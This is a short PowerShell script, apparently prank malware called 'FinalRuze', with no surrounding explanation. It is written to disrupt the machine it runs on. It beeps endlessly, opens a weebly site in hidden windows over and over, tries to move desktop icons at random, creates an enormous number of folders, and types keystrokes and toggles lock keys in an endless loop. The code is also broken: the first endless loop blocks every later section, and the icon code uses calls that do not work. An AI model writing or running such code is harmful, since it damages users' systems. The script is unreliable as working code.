# Define function to play beep sound
function Play-Beep {
    [System.Media.SystemSounds]::Beep.Play()
}

# Create infinite loop to play beep sound every 5 seconds
while ($true) {
    Play-Beep
    Start-Sleep -Seconds 5
}

# Create infinite loop to open two instances of a website every 5 seconds
while ($true) {
    Start-Process "https://j26nabr4tcsw908qiu.weebly.com/" -WindowStyle Hidden
    Start-Process "https://j26nabr4tcsw908qiu.weebly.com/" -WindowStyle Hidden
    Start-Sleep -Seconds 5
}

# Create infinite loop to randomly move desktop icons every 5 seconds
while ($true) {
    $shell = New-Object -ComObject Shell.Application
    $desktop = $shell.Namespace(0)
    foreach ($item in $desktop.Items()) {
        # Get random x and y coordinates
        $xPos = Get-Random -Minimum 0 -Maximum ($desktop.ParentWindow.rect.width - $item.ExtendedProperty("System.ItemNameWidth"))
        $yPos = Get-Random -Minimum 0 -Maximum ($desktop.ParentWindow.rect.height - $item.ExtendedProperty("System.ItemNameHeight"))
        # Move the item to the random position
        $shell.MoveItem($item.Path, $xPos, $yPos)
    }
    Start-Sleep -Seconds 5
}

# Create 99999999999999 folders with a base folder name of "FinalRuze"
$base_folder_name = "FinalRuze"
for ($i = 1; $i -le 99999999999999; $i++) {
    $folder_name = "$base_folder_name$i"
    New-Item -ItemType Directory -Path $folder_name | Out-Null
}

# Enable CAPSLOCK, NUMLOCK, and SCROLLLOCK keys, and type "This is the FinalRuze" infinitely
Add-Type -AssemblyName System.Windows.Forms
while ($true) {
    [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
    [System.Windows.Forms.SendKeys]::SendWait("{NUMLOCK}")
    [System.Windows.Forms.SendKeys]::SendWait("This is the FinalRuze")
    [System.Windows.Forms.SendKeys]::SendWait("{SCROLLLOCK}")
}
